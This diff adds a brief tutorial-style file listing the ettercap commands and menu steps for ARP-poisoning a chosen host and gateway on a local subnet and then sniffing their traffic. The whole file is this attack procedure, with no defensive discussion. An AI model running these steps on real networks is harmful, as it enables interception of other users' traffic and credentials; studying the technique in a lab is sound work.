@@ -1,0 +1,32 @@
+# Here are listed the steps needed to do the Man In The Middle Attack
+# using the tools: ettercap.
+
+#Open Ettercap in graphical mode
+
+ettercap -G
+
+#Select the sniff mode
+Sniff -> Unified sniffing
+ 
+#Scan for host inside your subnet
+
+Hosts -> Scan for hosts
+#The network range scanned will be determined by the IP settings of the interface you have just chosen in the previous step.
+
+#See the MAC & IP addresses of the hosts inside your subnet.
+
+#Select the machines to poison
+#We chose to ARP poison only machine 192.168.1.2 and the AP 192.168.1.1.
+Highlight the line containing 192.168.1.1 and click on the "target 1" button.
+Highlight the line containing 192.168.1.2 and click on the "target 2" button.
+
+#If you do not select any machines as target, all the machine inside the subnet will be ARP poisoned.
+
+#Start the ARP poisoning
+Mitm -> Arp poisoning
+Check Sniff remote connections
+ 
+#Start the sniffer
+#Finally, start the sniffer to collect statistics.
+
+Start -> Start sniffing
